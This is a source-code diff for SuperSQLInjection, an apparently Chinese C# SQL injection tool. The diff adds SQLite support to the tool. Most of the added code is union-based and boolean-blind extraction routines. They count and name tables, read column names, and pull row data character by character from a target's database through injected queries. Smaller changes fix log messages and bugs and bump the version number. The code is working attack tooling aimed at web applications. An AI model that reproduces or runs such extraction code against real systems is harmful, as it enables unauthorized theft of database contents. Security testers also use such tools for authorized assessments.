@@ -230,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20190102;
+        public static int version = 20190104;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -609,9 +609,17 @@ namespace SuperSQLInjection
         }
         public void getVariablesByUnionByDB2(Object v)
         {
-
             String[] sv = v.ToString().Split(':');
             String pay_load = DB2.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "");
+            String result = getOneDataByUnionOrError(pay_load);
+            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        public void getVariablesByUnionBySQLite(Object v)
+        {
+            String[] sv = v.ToString().Split(':');
+            String pay_load = SQLite.getUnionDataValue(config.columnsCount,config.showColumn, config.unionFill,sv[1]);
             String result = getOneDataByUnionOrError(pay_load);
             this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
             Interlocked.Increment(ref this.currentDataCount);
@@ -707,6 +715,9 @@ namespace SuperSQLInjection
                             break;
                         case DBType.DB2:
                             stp.QueueWorkItem<String>(getVariablesByUnionByDB2, v);
+                            break;
+                        case DBType.SQLite:
+                            stp.QueueWorkItem<String>(getVariablesByUnionBySQLite, v);
                             break;
                     }
                 }
@@ -811,6 +822,10 @@ namespace SuperSQLInjection
                             break;
                         case DBType.DB2:
                             stp.QueueWorkItem<String>(getVariableByBoolByDB2, v);
+                            break;
+                        case DBType.SQLite:
+                            //获取对应环境变量值
+                            stp.QueueWorkItem<String>(getVariableByBoolBySQLite, v);
                             break;
                     }
                 }
@@ -1132,7 +1147,7 @@ namespace SuperSQLInjection
         }
 
         /// <summary>
-        /// 获取环境变量oracle bool
+        /// 获取环境变量DB2 bool
         /// </summary>
         /// <param name="vers"></param>
         public void getVariableByBoolByDB2(Object vers)
@@ -1156,6 +1171,41 @@ namespace SuperSQLInjection
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取环境变量DB2 bool
+        /// </summary>
+        /// <param name="vers"></param>
+        public void getVariableByBoolBySQLite(Object vers)
+        {
+            try
+            {
+                String[] vs = vers.ToString().Split(':');
+                //判断变量长度
+                int len = getValueByStepUp(SQLite.bool_length.Replace("{data}", vs[1]), 0, 10);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+
+                String va_payload = SQLite.bool_value.Replace("{data}", vs[1]);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    String dp = va_payload.Replace("{index}", i.ToString());
+                    int ascii = getValue(dp, 32, 126);
+                    value += (char)ascii;
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                }
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
+
 
             }
             catch (Exception e)
@@ -1886,6 +1936,43 @@ namespace SuperSQLInjection
             Interlocked.Increment(ref this.currentTableCount);
         }
 
+        /// <summary>
+        /// bool方式获取表
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByBoolBySQLite(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                int selectIndex = sn.tn.Index;
+                //判断当前表长度
+                String data_payload = SQLite.table_value.Replace("{index}", sn.limit + "");
+                int len = getValue(SQLite.bool_length.Replace("{data}", data_payload), 1, 50);
+
+                //判断当前数据库对应的ascii码
+                String va_payload = SQLite.bool_value.Replace("{data}", data_payload);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                }
+                this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);
+                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "table");
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
 
 
         public void getTableNameValueByBoolBySQLServerSleep(Object osn)
@@ -2017,6 +2104,22 @@ namespace SuperSQLInjection
 
             SelectNode sn = (SelectNode)osn;
             String tables_value_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.table_value, sn.dbname, sn.tableName, sn.limit.ToString());
+            String result = getOneDataByUnionOrError(tables_value_payload);
+
+            this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
+            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
+        /// <summary>
+        /// 获取表名，多线程调用sqlite
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByUnionBySQLite(Object osn)
+        {
+
+            SelectNode sn = (SelectNode)osn;
+            String tables_value_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.table_value.Replace("{index}", sn.limit.ToString()));
             String result = getOneDataByUnionOrError(tables_value_payload);
 
             this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
@@ -2231,7 +2334,6 @@ namespace SuperSQLInjection
                 }
             }
             return len;
-
         }
 
         /// <summary>
@@ -3016,6 +3118,20 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.SQLite:
+                    //获取当前数据库长度
+                    this.tableCount = getValueByStepUp(SQLite.bool_tables_count, 0, 50);
+                    this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
+                    for (int i = 0; i < this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolBySQLite, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
+
             }
 
 
@@ -3127,6 +3243,23 @@ namespace SuperSQLInjection
                         sn.limit = i;
                         sn.dbname = dbName;
                         stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByDB2, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
+                case DBType.SQLite:
+                    //获取当前数据库表数量
+                    tables_count_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.tables_count);
+                    result = getOneDataByUnionOrError(tables_count_payload);
+
+                    this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
+                    this.tableCount = Tools.convertToInt(result);
+                    for (int i = 0; i < this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        sn.dbname = dbName;
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionBySQLite, sn);
                     }
                     stp.WaitForIdle();
                     break;
@@ -3255,9 +3388,14 @@ namespace SuperSQLInjection
             {
                 //获取环境变量
                 this.data_tvw_dbs.Nodes.Clear();
-                if (DBType.Access.ToString().Equals(this.cbox_basic_dbType.Text))
+                //没有库的数据库
+                if (DBType.Access.Equals(config.dbType))
                 {
                     addDBToTreeList(DBType.Access.ToString());
+                }
+                else if (DBType.SQLite.Equals(config.dbType))
+                {
+                    addDBToTreeList(DBType.SQLite.ToString());
                 }
                 //检查注入配置
                 if (checkConfig())
@@ -3379,7 +3517,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3428,7 +3566,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3442,7 +3580,7 @@ namespace SuperSQLInjection
             try
             {
                 SelectNode sn = (SelectNode)osn;
-                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.columnName, "UTF-8")).Replace("{dbname}", sn.dbname);
+                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")).Replace("{dbname}", sn.dbname);
                 int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", data_payload), 0, 10);
                 String value = "";
                 //获取值
@@ -3474,7 +3612,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3488,7 +3626,7 @@ namespace SuperSQLInjection
             try
             {
                 SelectNode sn = (SelectNode)osn;
-                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.columnName, "UTF-8")).Replace("{dbname}", sn.dbname);
+                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")).Replace("{dbname}", sn.dbname);
                 int len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);
                 String value = "";
                 //获取值
@@ -3531,7 +3669,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3568,7 +3706,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message,LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message,LogLevel.error);
             }
         }
 
@@ -3604,7 +3742,47 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取列明称,bool方式
+        /// </summary>
+        /// <param name="osn">表的节点</param>
+        public void getColumnNameByBoolBySQLite(Object osn)
+        {
+
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                //判断当前长度
+                String data_payload = SQLite.column_value.Replace("'{table}'", Tools.strToChar(sn.tableName,"UTF-8","||")).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
+                int len = getValueByStepUp(SQLite.bool_length.Replace("{data}", data_payload), 1, 50);
+
+                //判断当前数据库对应的ascii码
+                String va_payload = SQLite.bool_value.Replace("{data}", data_payload);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                }
+                List<String> columns = Tools.GetSQLiteColumns(value);
+                this.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + String.Join(",", columns), LogLevel.info);
+                foreach (String column in columns) {
+
+                    this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, column, "column");
+                }
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3628,12 +3806,12 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
         /// <summary>
-        /// 获取列名，union MySQL
+        /// 获取列名，union SQLServer
         /// </summary>
         /// <param name="osn"></param>
         public void getColumnNameByUnionBySQLServer(Object osn)
@@ -3650,7 +3828,33 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取列名，union SQLServer
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getColumnNameByUnionBySQLite(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+
+                String column_Name_data = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill,SQLite.column_value.Replace("'{table}'",Tools.strToChar(sn.tableName,"UTF-8","||")));
+                String result = getOneDataByUnionOrError(column_Name_data);
+                //SQLite获取的列需要进行处理
+                List<String> columns = Tools.GetSQLiteColumns(result);
+                this.Invoke(new showLogDelegate(log), "发现列：" + String.Join(",",columns), LogLevel.info);
+                foreach (String column in columns) {
+
+                    this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, column, "column");
+                }
+            }
+            catch (Exception e)
+            {
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3738,7 +3942,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3754,7 +3958,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message,LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message,LogLevel.error);
             }
         }
 
@@ -3770,7 +3974,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
             }
         }
 
@@ -3786,7 +3990,7 @@ namespace SuperSQLInjection
             catch (Exception e)
             {
 
-                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message,LogLevel.error);
+                this.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message,LogLevel.error);
             }
         }
 
@@ -3918,6 +4122,13 @@ namespace SuperSQLInjection
                                 }
                                 stp.WaitForIdle();
                                 break;
+                            case DBType.SQLite: 
+                                SelectNode csn = new SelectNode();
+                                csn.tn = ctn;
+                                csn.tableName = tableName;
+                                stp.QueueWorkItem<SelectNode>(getColumnNameByBoolBySQLite, csn);
+                                stp.WaitForIdle();
+                                break;
                         }
 
                     }
@@ -4038,6 +4249,12 @@ namespace SuperSQLInjection
                                     stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByDB2, sn);
                                 }
                                 stp.WaitForIdle();
+                                break;
+                            case DBType.SQLite:
+                                SelectNode csn = new SelectNode();
+                                csn.tn = ctn;
+                                csn.tableName = tableName;
+                                stp.QueueWorkItem<SelectNode>(getColumnNameByUnionBySQLite, csn);
                                 break;
                         }
 
@@ -4454,6 +4671,69 @@ namespace SuperSQLInjection
             Interlocked.Increment(ref this.currentDataCount);
         }
 
+        /// <summary>
+        /// 获取数据
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByBoolBySQLite(Object opam)
+        {
+            try
+            {
+
+                GetDataPam gp = (GetDataPam)opam;
+
+                ListViewItem lvi = null;
+
+                foreach (String columnName in gp.columns)
+                {
+                    //取每一列的值
+                    String data_payload = SQLite.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
+                    String payload_len = SQLite.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);
+
+                    int len = getValueByStepUp(payload_len, 0, 50);
+
+                    String value = "";
+                    //获取值
+                    for (int i = 1; i <= len; i++)
+                    {
+                        //取值payload，替换对应下标值
+                        String unicode_data_payload = SQLite.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
+
+                        //根据unicode值得长度确定范围在判断，提高效率
+                        for (int j = 3; j <= 7; j++)
+                        {
+                            Boolean isLarge = checkLen(SQLite.check_li_value.Replace("{data}", unicode_data_payload), j);
+                            if (isLarge)
+                            {
+                                int end = (int)Math.Pow(10, j - 1) - 1;
+                                int unicode = getValue(SQLite.bool_noUnicode_value.Replace("{data}", unicode_data_payload), 0, end);
+                                value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                                break;
+                            }
+                        }
+                    }
+                    if (lvi == null)
+                    {
+                        lvi = new ListViewItem(value);
+                    }
+                    else
+                    {
+                        lvi.SubItems.Add(value);
+                    }
+                    this.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行,"+columnName+"的值:"+ value, LogLevel.info);
+
+                }
+                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
+                this.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit+1) + "行的值！", LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
 
         /// <summary>
         /// 获取数据
@@ -4802,6 +5082,29 @@ namespace SuperSQLInjection
             }
             Interlocked.Increment(ref this.currentDataCount);
         }
+
+        /// <summary>
+        /// 获取数据，union方式
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByUnionBySQLite(Object opam)
+        {
+            try
+            {
+                GetDataPam gp = (GetDataPam)opam;
+                ListViewItem lvi = new ListViewItem();
+                String result = getOneDataByUnionOrError(SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.limit.ToString()));
+                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
+                this.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit+1) + "行的值！", LogLevel.info);
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
 
         /// <summary>
         /// 获取数据，union方式
@@ -5237,6 +5540,32 @@ namespace SuperSQLInjection
                     }
 
                     break;
+                case DBType.SQLite:
+                    isMax = findKeyInBody(SQLite.bool_datas_count.Replace("{table}", this.curren_table), start + dataCount);
+
+                    if (isMax)
+                    {
+                        //下标从1开始
+                        for (int i = 0; i < dataCount; i++)
+                        {
+                            GetDataPam gd = new GetDataPam();
+                            gd.columns = columns;
+                            gd.dbname = this.curren_db;
+                            gd.table = this.curren_table;
+                            gd.limit = start + i;
+                            gd.isMuStr = config.isMuStr;
+                            stp.WaitFor(100);
+                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolBySQLite, gd);
+
+                        }
+                        stp.WaitForIdle();
+                    }
+                    else
+                    {
+                        MessageBox.Show("没有这么多行数据，请改小点！");
+                    }
+
+                    break;
             }
 
         }
@@ -5388,7 +5717,7 @@ namespace SuperSQLInjection
 
                 case DBType.Access:
 
-                    datas_count_payload = Access.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, Access.data_count.Replace("{table}", this.curren_table)).Replace("{table}", this.curren_table);
+                    datas_count_payload = Access.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, Access.data_count.Replace("{table}", this.curren_table));
                     result = getOneDataByUnionOrError(datas_count_payload);
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
@@ -5554,6 +5883,35 @@ namespace SuperSQLInjection
                         gd.isMuStr = config.isMuStr;
                         stp.WaitFor(100);
                         stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByDB2, gd);
+                    }
+                    stp.WaitForIdle();
+                    break;
+                case DBType.SQLite:
+
+                    datas_count_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.data_count.Replace("{table}", this.curren_table));
+                    result = getOneDataByUnionOrError(datas_count_payload);
+
+                    this.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
+
+                    this.dataCount = Tools.convertToInt(result);
+
+                    if (this.dataCount < (dataCount + start))
+                    {
+                        this.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
+                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
+                        break;
+                    }
+                    //下标从1开始
+                    for (int i = 0; i < dataCount; i++)
+                    {
+                        GetDataPam gd = new GetDataPam();
+                        gd.columns = columns;
+                        gd.dbname = this.curren_db;
+                        gd.table = this.curren_table;
+                        gd.limit = start + i;
+                        gd.isMuStr = config.isMuStr;
+                        stp.WaitFor(100);
+                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionBySQLite, gd);
                     }
                     stp.WaitForIdle();
                     break;
@@ -6246,7 +6604,6 @@ namespace SuperSQLInjection
                 }
                 if (list_columns.Count > 0)
                 {
-
                     this.data_dbs_lvw_data.Items.Clear();
                 }
                 this.currentDataCount = 0;
@@ -6353,12 +6710,10 @@ namespace SuperSQLInjection
                 {
                     this.file_cbox_readWrite.Enabled = true;
                     this.file_cbox_readWrite.Items.Add("请选择读写文件方式");
-                    this.file_cbox_readWrite.Items.AddRange(list.ToArray());
-                    
+                    this.file_cbox_readWrite.Items.AddRange(list.ToArray());            
                 }
                 else {
-                    this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
-                   
+                    this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");   
                 }
             }
             catch (Exception ee) {
@@ -6389,24 +6744,16 @@ namespace SuperSQLInjection
 
         public void loadVersToListView(DBType dbtype) {
             List<String> vers = null;
-            switch (config.dbType)
+            try
             {
-                case DBType.MySQL:
-                    vers = MySQL.vers;
-                    break;
-                case DBType.SQLServer:
-                    vers = SQLServer.vers;
-                    break;
-                case DBType.Oracle:
-                    vers = Oracle.vers;
-                    break;
-                case DBType.PostgreSQL:
-                    vers = PostgreSQL.vers;
-                    break;
-                case DBType.DB2:
-                    vers = DB2.vers;
-                    break;
+                Type type = Type.GetType("SuperSQLInjection.payload." + config.dbType.ToString());
+                vers = (List<String>)type.GetField("vers").GetValue(null);
             }
+            catch (Exception e)
+            {
+                Tools.SysLog("loadVersToListView异常：" + e.Message);
+            }
+           
             this.data_lvw_ver.Items.Clear();
             if (vers!=null&& vers.Count>0)
             {
@@ -7332,8 +7679,6 @@ namespace SuperSQLInjection
         {
             try
             {
-                //取值payload，替换对应下标值
-                //select UNICODE(substring(@@version,{index},1))
                 //取值payload，替换对应下标值
                 String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", index + "").Replace("{data}", SQLServer.file_content);
                 //取unicode转换后的长度
@@ -8903,7 +9248,7 @@ namespace SuperSQLInjection
 
         private void 版本ToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("V1.1正式版----" + version);
+            MessageBox.Show("V1.0正式版----" + version);
         }
 
         private void data_dbs_tsmi_saveDTCStruct_Click(object sender, EventArgs e)
